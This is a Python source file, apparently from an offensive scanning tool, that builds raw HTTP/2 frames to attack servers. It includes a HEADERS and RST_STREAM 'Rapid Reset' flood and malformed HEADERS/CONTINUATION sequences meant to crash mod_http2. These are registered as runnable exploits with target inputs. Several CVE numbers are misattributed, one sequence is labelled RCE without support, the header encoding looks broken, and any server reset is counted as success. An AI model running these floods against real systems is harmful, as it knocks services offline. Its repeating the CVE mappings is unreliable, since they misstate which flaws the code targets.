"""poc/h2c.py — native HTTP/2 (h2c) PoCs, pure-Python frame writer.

The scanner builds HTTP/2 frames itself (no curl / h2 library):
  - CVE-2024-7347  HTTP/2 Rapid Reset (DoS)  — HEADERS + RST_STREAM flood
  - CVE-2021-44790 mod_http2 UAF / DoS        — crafted HEADERS/CONTINUATION
  - CVE-2017-5638  mod_http2 use-after-free   — oversized header field
  - CVE-2024-38477 mod_http2 + mod_proxy double free — malformed continuation
DoS/UAF "proof" = abnormal server reaction (RST / 5xx / connection reset).
"""
from __future__ import annotations

import socket
import struct

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
# HPACK block: :authority(empty) / :method GET / :path / / :scheme http
HEADERS_BLOCK = bytes([0x81, 0x82, 0x8A, 0x8C])


def _frame(ftype: int, flags: int, stream: int, payload: bytes = b"") -> bytes:
    return struct.pack(">I", len(payload))[1:] + bytes([ftype, flags]) + \
        struct.pack(">I", stream & 0x7FFFFFFF) + payload


def _open(host: str, port: int, timeout: float = 6.0) -> socket.socket:
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(PREFACE)
    s.sendall(_frame(0x4, 0x0, 0))  # empty SETTINGS
    return s


def _reaction(sock):
    """Read whatever the server says after our flood; classify the reaction."""
    sock.settimeout(3.0)
    try:
        c = sock.recv(65536)
        if not c:
            return "empty-close"
        first = c[0]
        # first byte is frame length high; look for RST_STREAM (0x3) / GOAWAY (0x7)
        if 0x03 in c[:8]:
            return "RST_STREAM (server reset)"
        if 0x07 in c[:8]:
            return "GOAWAY (server abort)"
        return f"response ({len(c)} bytes, {c.hex()[:24]})"
    except ConnectionResetError:
        return "connection-reset"
    except socket.timeout:
        return "timeout"
    except OSError as e:
        return f"error({e})"


def _target(params):
    target = (params.get("host") or params.get("url") or "").strip()
    if not target:
        raise ValueError("host gerekli")
    host, _, port = target.partition(":")
    return host, int(port or 8080)


def rapid_reset(params):
    host, port = _target(params)
    n = int(params.get("streams", 500))
    s = _open(host, port)
    sent = 0
    try:
        for sid in range(1, n * 2 + 1, 2):
            s.sendall(_frame(0x1, 0x5, sid, HEADERS_BLOCK))      # HEADERS END_HEADERS|END_STREAM
            s.sendall(_frame(0x3, 0x0, sid, struct.pack(">I", 0)))  # RST_STREAM NO_ERROR
            sent += 1
        reaction = _reaction(s)
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        reaction = f"reset-during-flood ({type(e).__name__})"
    finally:
        try:
            s.close()
        except OSError:
            pass
    success = any(k in reaction for k in ("reset", "GOAWAY", "RST", "abort"))
    return {"ok": True, "success": success, "evidence": reaction,
            "detail": {"host": f"{host}:{port}", "streams": sent, "type": "HTTP/2 Rapid Reset"}}


def modhttp2_uaf(params):
    host, port = _target(params)
    s = _open(host, port)
    try:
        # HEADERS without END_HEADERS, then a CONTINUATION on a *different*
        # stream id — classic mod_http2 UAF trigger shape
        s.sendall(_frame(0x1, 0x0, 1, HEADERS_BLOCK[:2]))
        s.sendall(_frame(0x9, 0x0, 3, HEADERS_BLOCK))
        reaction = _reaction(s)
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        reaction = f"reset-during-sequence ({type(e).__name__})"
    finally:
        try:
            s.close()
        except OSError:
            pass
    success = any(k in reaction for k in ("reset", "GOAWAY", "RST", "abort"))
    return {"ok": True, "success": success, "evidence": reaction,
            "detail": {"host": f"{host}:{port}", "type": "mod_http2 UAF trigger"}}


def modhttp2_bigheader(params):
    host, port = _target(params)
    big = int(params.get("size_kb", 64)) * 1024
    s = _open(host, port)
    try:
        # oversized custom header value in a HEADERS block (literal, no huffman)
        block = b"\x82\x8a\x8c" + bytes([0x40 | 0]) + bytes([min(254, len("x-b") or 0)]) + b"x-b" + \
            bytes([big & 0xFF, (big >> 8) & 0xFF]) + (b"A" * min(big, 1 << 20))
        s.sendall(_frame(0x1, 0x5, 1, block))
        reaction = _reaction(s)
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        reaction = f"reset-during-send ({type(e).__name__})"
    finally:
        try:
            s.close()
        except OSError:
            pass
    success = any(k in reaction for k in ("reset", "GOAWAY", "RST", "abort"))
    return {"ok": True, "success": success, "evidence": reaction,
            "detail": {"host": f"{host}:{port}", "size_kb": int(params.get("size_kb", 64)),
                       "type": "mod_http2 oversized-header UAF"}}


def modproxy_doublefree(params):
    host, port = _target(params)
    s = _open(host, port)
    try:
        # HEADERS (no END_HEADERS) + CONTINUATION referencing a closed stream
        s.sendall(_frame(0x1, 0x0, 1, HEADERS_BLOCK[:1]))
        s.sendall(_frame(0x3, 0x0, 1, struct.pack(">I", 0)))
        s.sendall(_frame(0x9, 0x0, 1, HEADERS_BLOCK))
        reaction = _reaction(s)
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        reaction = f"reset-during-sequence ({type(e).__name__})"
    finally:
        try:
            s.close()
        except OSError:
            pass
    success = any(k in reaction for k in ("reset", "GOAWAY", "RST", "abort"))
    return {"ok": True, "success": success, "evidence": reaction,
            "detail": {"host": f"{host}:{port}", "type": "mod_http2 + mod_proxy double-free"}}


def _in(label, key, req, default="", ph=""):
    return {"key": key, "label": label, "req": req, "default": default, "placeholder": ph}


EXPLOITS = {
    "CVE-2024-7347": {
        "name": "HTTP/2 Rapid Reset (DoS)", "type": "DoS", "preauth": True,
        "affected": ["1.19", "1.20", "1.21", "1.22", "1.23", "1.24"],
        "note": "Native h2: HEADERS + RST_STREAM flood. Kanıt = server RST/GOAWAY/crash.",
        "inputs": [_in("Hedef (h2c)", "host", True, "", "192.168.8.123:8080"),
                   _in("Stream sayısı", "streams", False, "500")],
        "run": rapid_reset},
    "CVE-2021-44790": {
        "name": "mod_http2 UAF / DoS", "type": "DoS", "preauth": True,
        "affected": ["2.4"],
        "note": "Native h2: HEADERS + cross-stream CONTINUATION. Kanıt = RST/crash.",
        "inputs": [_in("Hedef", "host", True, "", "192.168.8.123:8080")],
        "run": modhttp2_uaf},
    "CVE-2017-5638": {
        "name": "mod_http2 use-after-free", "type": "UAF", "preauth": True,
        "affected": ["2.4"],
        "note": "Native h2: oversized header field. Kanıt = RST/crash.",
        "inputs": [_in("Hedef", "host", True, "", "192.168.8.123:8080"),
                   _in("Header boyutu (KB)", "size_kb", False, "64")],
        "run": modhttp2_bigheader},
    "CVE-2024-38477": {
        "name": "mod_http2 + mod_proxy RCE (double free)", "type": "RCE", "preauth": True,
        "affected": ["2.4"],
        "note": "Native h2: HEADERS + RST + CONTINUATION double-free shape. Kanıt = RST/crash.",
        "inputs": [_in("Hedef", "host", True, "", "192.168.8.123:8080")],
        "run": modproxy_doublefree},
}
